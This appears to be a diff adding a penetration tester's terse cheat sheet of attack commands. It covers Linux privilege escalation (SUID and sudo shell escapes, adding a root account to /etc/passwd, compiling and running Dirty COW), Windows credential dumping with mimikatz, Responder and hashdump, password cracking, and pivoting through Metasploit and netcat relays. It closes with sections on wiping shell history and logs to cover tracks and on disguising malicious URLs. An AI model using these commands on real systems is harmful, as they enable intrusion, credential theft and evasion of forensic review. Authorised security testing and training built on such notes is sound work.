+
+(look for files with world read/write)
+/usr/bin/find / -maxdepth 4 -type f -perm -777 2>/dev/null
+/usr/bin/find / -maxdepth 4 -type d -perm -777 2>/dev/null
+(old) /usr/bin/find / -writable -type f -maxdepth 2 2>/dev/null
+(look for any writable files)
+/usr/bin/find / -maxdepth 4 -writable 2>/dev/null | grep -v “proc”
+(writable dirs)
+/usr/bin/find / 
+
+Find SUID binaries: (binary where non-root users can run with elevated privs, like passwd and ping)
+/usr/bin/find / * -user root -perm -4000 -print 2>/dev/null
+Abuse SUID binaries (text editor):
+perl -e ‘print crypt("YourPasswd", "salt"),"\n"'
+perl -e ‘print crypt("bob", "bob"),"\n"’
+(use text editor, or echo/tee) sudo echo ‘bob:boJIq0xJ2/a6M:0:0:root:/root:/bin/bash’ >> /etc/passwd
+
+Look for plaintext creds
+grep -r “password” /etc    (add other directories)
+grep -r “user” /etc
+grep -r “username” /etc
+find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"
+su bob
+
+
+check cronjobs for scripts, programs, etc that run with elevated privs       cat /etc/crontab
+
+sudo examples:
+sudo vim -c ‘!sh’
+sudo -u root vim -c ‘!sh’
+sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’
+sudo find /home -exec sh -I \;
+
+kernel exploit? Does target have compiler or required languages installed on it, or do you need to recreate the environment? gcc -m32 --static    (possibly copy gcc over into /tmp… painful)
+security misconfiguration in a piece of software?
+Misconfiguration on the OS itself? 
+Who are the sudo users? Any sudo misconfigs?
+Cron job abuse
+Any SUID binaries? 
+“.” In $PATH?
+
+Examples:
+https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs  https://dirtycow.ninja 
+gcc -pthread -o cowroot cowroot.c          (use id to check your uid if it worked)
+(may help with stability – better to establish secondary persistence) echo 0 > /proc/sys/vm/dirty_writeback_centisecs 
+
+Service example: https://www.exploit-db.com/exploits/1518   MySQL 4/5 run system cmds as root
+
+kernel exploit example: https://www.exploit-db.com/exploits/40616    *Read code before running it! 
+(make sure to choose proper payload in code by commenting/uncommenting)   dirty cow
+gcc -pthread 40616.c -o cowroot
+(copy cowroot over to your target somehow)
+./cowroot
+
+echo 0 > /proc/sys/vm/dirty_writeback_centisecs    (known to stabilize this particular priv esc)
+
+*64 bit payload is default, uncomment 32 payload and comment out 64 for older boxes
+* sometimes 32 bit libraries are missing – one example target I needed these:
+sudo apt install gcc-multilib
+gcc -pthread -m32 -static -o cow32 cowroot32.c
+scp cow32 john@10.12.1.53:/tmp/
+$ chmod 755 cow32
+$ ./cow32 
+$ root@tgt:/tmp/
+
+
+gcc -Wall -m32 -static -fPIC
+
+
+
+[+] Password Cracking/Lateral Movement/Obfuscation/Cover Tracks [+]
+
+
+On a windows network with Active Directory?
+start running Responder
+https://github.com/lgandx/Responder/ 
+# responder -I eth0 -i 172.116.XX.XX  (your server IP)
+snatch hashes and start pivoting (crack hashes to get plaintext for weak ones)
+
+Acquiring hashes
+meterpreter > hashdump       or       meterpreter > run hashdump   (runs the hashdump script) 
+needs system level access                                 may work with just an admin account  
+(try both)
+mimikatz
+
+linux/unix:
+Grab a copy of  /etc/passwd    and   /etc/shadow
+unshadow script in john the ripper: will combine the files, placing hashes to users
+unix format in /etc/passwd: [username]:[encyptedpass]:[UID]:[DefaultGID]:[GECOSinfo]:[homedir]:[loginshell]
+
+Windows:
+pwdump – used to grab SAM files out of memory
+pwdump7 – grabs them off the disk
+
+(old) mimikatz.exe   or   mimikatz Meterpreter extension  (dump from memory, possibly plain text password!) 
+(newer) meterpeter> load kiwi    meterpreter> creds_all       (make sure you are migrated to a 64bit process if on a 64 bit system)
+If win10, system won’t store in LSASS by default, so it won’t show plaintext passwords - add registry entry then screenlock PC and wait for user to input their password to grab it from LSASS
+
+Golden ticket – need password hash from krbtgt user on ther DC, plus account name of a domain admin (domain name and SID also) – kerberos_ticket_use /path/to/ticket.tkt  
+
+use keystroke logger (meterpreter one, or third party software)
+on a domain controller, use volume shadow copy service (VSS) to retrieve ntds.dit
+
+you can try to sniff them off the network (OS independent)
+
+password cracking:
+hash-identifier (kali)
+
+john the ripper (classic CPU based cracker, tons formats and decent auto-detection) better than hashcat for small passwords
+./unshadow script in john (linux/unix)
+john --format=format --wordlist=/path/to/wordlist.txt hashes.file
+john –show hashes.file
+
+
+hashcat (GPU based, more active dev) 
+hashcat -a=ATTACKMODE -m 5600(HASHTYPE value) -I CHARSETMASK(a,I,u,d,h,H,etc)  
+
+ophcrack      (for Windows)
+
+http://cracker.offensive-security.com/ 
+https://crackstation.net/ 
+https://hashkiller.co.uk/Cracker/ 
+Google the hash    (be very careful with this; don’t throw a customer’s stuff out into the wild)
+
+gpg2john           for gnupg encryption keys
+
+
+Creating password lists
+crunch [min length] [max length] [charset] [options]
+example: crunch 4 4 ABCDEFGHIJKLMNOPQRSTUVWXYZ -o /root/Desktop/wordlist.txt
+
+cewl -d 1 -m 8 -w /root/Desktop/cewl.txt https://www.kali.org    (crawl webpages for keywords to use in passwords)
+
+pass the hash
+meterpreter
+
+psexec \\[targetIP] -d -u [user] -p [password] [command]   if you don’t put user and pass, will use creds from acount you are currently on) (-d makes it hidden in background)
+must have smb access of target; must have admin creds
+
+C:\>psexec.exe -i -s cmd.exe           (already admin, need system)
+
+Use simplesmb server to host tools or shells, so you don’t have to copy files onto your victim’s box
+./simplesmb.py
+ 
+iptables rules
+sudo iptables -S
+iptables -A INPUT -s 10.xx.xx.xx -p tcp --dport 22 -j DROP
+iptables -A INPUT -s 10.xx.xx.xx -p tcp --dport 4444 -j ACCEPT 
+iptables -D INPUT -s 10.xx.xx.xx -p tcp --dport 4444 -j ACCEPT   (delete one rule)
+sudo iptables -F INPUT           (delete all in input)
+sudo iptables -F                        (flush all rules)
+
+
+**Pivoting
+
+pivoting with metasploit
+
+meterpreter > run autoroute -h
+meterpreter > run autoroute -s 10.1.13.0/24
+meterpreter > run autoroute -p (show active routes)
+meterpreter > background
+msf exploit(msXX_XX_X) > use auxiliary/scanner/portscan/tcp      (show options, fill in, run)
+if SMB open and you have creds:  msf auxiliary(tcp) > use exploit/windows/smb/psexec (show options, fill, run)
+
+meterpreter > background
+msf exploit(handler) > route add 192.168.15.1 255.255.255.0 1  (1 is for the session to apply it to)
+[*] Route added
+msf exploit(handler) > route print
+
+meterpreter > run arp_scanner -r 192.168.15.1/24
+msf exploit(handler) > use auxiliary/scanner/portscan/tcp 
+msf auxiliary(tcp) > set RHOSTS 192.168.15.1
+RHOSTS => 192.168.15.1
+msf auxiliary(tcp) > set PORTS 1-1024
+PORTS => 1-1024
+
+meterpreter > portfwd add -l 8000 -p 80 -r 192.168.15.1 (open up web browser to 127.0.0.1:8000)
+meterpreter > portfwd delete -l 8000 -p 80 -r 192.168.15.1 (cleanup)
+meterpreter > portfwd add -l 25000 -p 22 -r 192.168.15.2 (nc -v 127.0.0.1 25000 to connect to target)
+meterpreter > portfwd delete -l 25000 -p 22 -r 192.168.15.2 (cleanup)
+
+
+ncat
+(on our attacking machine)   ncat -lv --broker -m2 55555
+(on our middle-man relay)   ncat -v xx.xx.xx.xx 55555 -c "ncat -v xx.xx.xx.xx 10000"
+
+
+mknod fifo p
+nc -nvlp 4444 0< fifo | nc 10.10.10.10 445 1> fifo
+
+port scanner on Windows cmd line (no tools):
+for /L %i in (1,1,255) do @ping -n 1 192.168.0.%i | find "Reply"
+
+
+msfmap (nmap on your victim’s box; in meterpreter)
+
+proxychains
+
+
+SSH tunneling
+SSH port forward: ssh -L [localport]:127.0.0.1:[port_to_access_on_victim] -N -f -l [victim_user] [victim_ip]  (-N is for don’t execute a remote command, -f runs ssh in the background, -l define remote user)
+
+
+
+
+
+
+
+[+] Cleanup [+]
+
+
+drop SMB sessions:
+net session \\[targetIP] /del /y
+
+delete entries out of .bash_history
+history -d 2038     (specific entry with plaintext password, etc)
+history -cw        (clear all entries) 
+make sure your last command is not in their either!
+Worst case: unset HISTFILE then kill -9 $$
+
+Clean up scripts
+Delete your tools off the box
+Check /tmp
+Auth.log
+
+
+ 
+[+] Trolling: [+]
+
+meterpreter> use auxiliary/server/(whatever server you want to serve up)
+
+
+make some malware:
+https://www.facebook.com:443@3232235777 (last part is decimal representation of hex, which equals out to an IPv4 address of malicious site)
+type    ://   username   :password   @   site   /resource
+
+port wrapping ports above 65535 (netcat listener on 70000 for example, will listen on 4464. 70k – 4464 = 65535)
+ 
+
